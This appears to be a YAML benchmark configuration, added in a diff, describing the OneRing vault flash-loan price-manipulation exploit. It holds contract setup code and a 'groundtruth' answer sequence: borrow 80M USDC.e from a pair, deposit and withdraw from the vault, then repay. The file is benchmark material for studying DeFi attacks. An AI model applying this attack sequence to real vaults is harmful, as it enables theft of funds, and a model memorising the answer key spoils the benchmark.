@@ -1,0 +1,66 @@
+# Information for benchmarks building.
+# This benchmark is modified.
+project_name: "OneRing"
+
+ctrt_name2cls:
+  - ["usdce", "USDCE"]
+  - ["mim", "MIM"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+  - ["strategy", "Strategy"]
+  - ["vault", "OneRingVault"]
+
+ctrt_name2deploy:
+  - ["usdce", ""]
+  - ["mim", "new MIM('Magic Internet Money', 'MIM', 18, 
+      address(0x0000000000000000000000000000000000000000), address(0xfA9dA51631268A30Ec3DDd1CcBf46c65FAD99251))"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  - ["strategy", "new Strategy()"]
+  - ["vault", "new OneRingVault([address(usdce)], address(strategy), totalSupplyvault)"]
+
+extra_actions:
+  - "function transaction_vault_usdce(uint256 amount) internal {
+        usdce.approve(address(vault), type(uint256).max);
+        vault.depositSafe(amount, address(usdce), 1);
+        vault.withdraw(vault.balanceOf(address(attacker)), address(usdce));
+    }"
+
+extra_deployments:
+  - "usdce.transfer(address(strategy), 10_000_000e6);"
+  - "strategy.afterDeploy(address(vault), address(pair), address(usdce));"
+extra_statements: []
+
+attack_goal_str: "usdce;1e6"
+
+groundtruth:
+  - ["borrow", "pair", "usdce", "80000000e6"]
+  - ["transaction", "vault", "usdce", "usdce.balanceOf(attacker)"]
+  - ["payback", "pair", "usdce", "80000000e6 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "usdce":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "mim":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "pair":
+    is_swappair: true
+    uniswap_order: ["usdce", "mim"]
+    support_swaps:
+      "usdce": ["mim", "usdce"]
+      "mim": ["mim", "usdce"]
+    is_oracle: true
+    oracle: "pair"
+    is_lendpool: true
+  "vault":
+    is_defientry: true
+    hacked_assets: ["usdce"]
+
+pattern: "BuySell Manipulation"
